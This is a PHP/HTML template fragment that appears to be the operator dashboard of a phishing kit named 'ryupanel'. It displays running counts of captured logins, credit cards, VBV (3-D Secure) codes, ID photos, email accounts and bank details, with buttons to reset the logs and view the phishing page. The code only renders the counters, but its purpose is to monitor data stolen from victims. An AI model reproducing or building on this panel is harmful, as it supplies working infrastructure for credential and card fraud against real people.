<header class="w3-container w3-padding-32 w3-center w3-black" id="home">
    <h1 class="w3-jumbo"> <?=CONFIG['web']['app_name'];?>. <span class="w3-hide-small"><?=CONFIG['web']['app_version'];?></span></h1>
    <p><?=CONFIG['web']['short_desc'];?>.</p>
    <a href="?c=ryupanel&a=reset" class="w3-button w3-green" > RESET LOGS</a>
  <a href="?c=ryupanel&a=visit" class="w3-button w3-red" > VISIT PAGE</a>
  <br><br>
    <div class="w3-row-padding w3-margin-bottom">
    <div class="w3-half">
      <div class="w3-container w3-teal w3-padding-16">
        <div class="w3-left"><i class="fa fa-users w3-xxxlarge"></i></div>
        <div class="w3-right">
          <h3><?=$count_visitor;?></h3>
        </div>
        <div class="w3-clear"></div>
        <h4>Visitors</h4>
      </div>
    </div>
    <div class="w3-half">
      <div class="w3-container w3-blue-gray w3-padding-16">
        <div class="w3-left"><i class="fa fa-bug w3-xxxlarge"></i></div>
        <div class="w3-right">
          <h3><?=$count_bot;?></h3>
        </div>
        <div class="w3-clear"></div>
        <h4>Bots</h4>
      </div>
    </div>
</div>
<div class="w3-row-padding w3-margin-bottom">
    <div class="w3-col s12 m4 l4">
      <div class="w3-container w3-green w3-padding-16">
        <div class="w3-left"><i class="fa fa-sign-in w3-xxxlarge"></i></div>
        <div class="w3-right">
          <h3><?=$count_login;?></h3>
        </div>
        <div class="w3-clear"></div>
        <h4>Login</h4>
      </div>
    </div>
    <div class="w3-col s12 m4 l4">
      <div class="w3-container w3-amber w3-text-white w3-padding-16">
        <div class="w3-left"><i class="fa fa-credit-card w3-xxxlarge"></i></div>
        <div class="w3-right">
          <h3><?=$count_card;?></h3>
        </div>
        <div class="w3-clear"></div>
        <h4>Card</h4>
      </div>
    </div>
    <div class="w3-col s12 m4 l4">
      <div class="w3-container w3-deep-orange w3-text-white w3-padding-16">
        <div class="w3-left"><i class="fa fa-cc-visa w3-xxxlarge"></i></div>
        <div class="w3-right">
          <h3><?=$count_vbv;?></h3>
        </div>
        <div class="w3-clear"></div>
        <h4>VBV</h4>
      </div>
    </div>
</div>
<div class="w3-row-padding w3-margin-bottom">
    <div class="w3-col s12 m4 l4">
      <div class="w3-container w3-deep-purple w3-text-white w3-padding-16">
        <div class="w3-left"><i class="fa fa-photo w3-xxxlarge"></i></div>
        <div class="w3-right">
          <h3><?=$count_pap;?></h3>
        </div>
        <div class="w3-clear"></div>
        <h4>Photo</h4>
      </div>
    </div>
    <div class="w3-col s12 m4 l4">
      <div class="w3-container w3-purple w3-text-white w3-padding-16">
        <div class="w3-left"><i class="fa fa-envelope w3-xxxlarge"></i></div>
        <div class="w3-right">
          <h3><?=$count_email;?></h3>
        </div>
        <div class="w3-clear"></div>
        <h4>Email</h4>
      </div>
    </div>
    <div class="w3-col s12 m4 l4">
      <div class="w3-container w3-blue w3-text-white w3-padding-16">
        <div class="w3-left"><i class="fa fa-bank w3-xxxlarge"></i></div>
        <div class="w3-right">
          <h3><?=$count_bank;?></h3>
        </div>
        <div class="w3-clear"></div>
        <h4>Bank</h4>
      </div>
    </div>
  </div>

  </header>
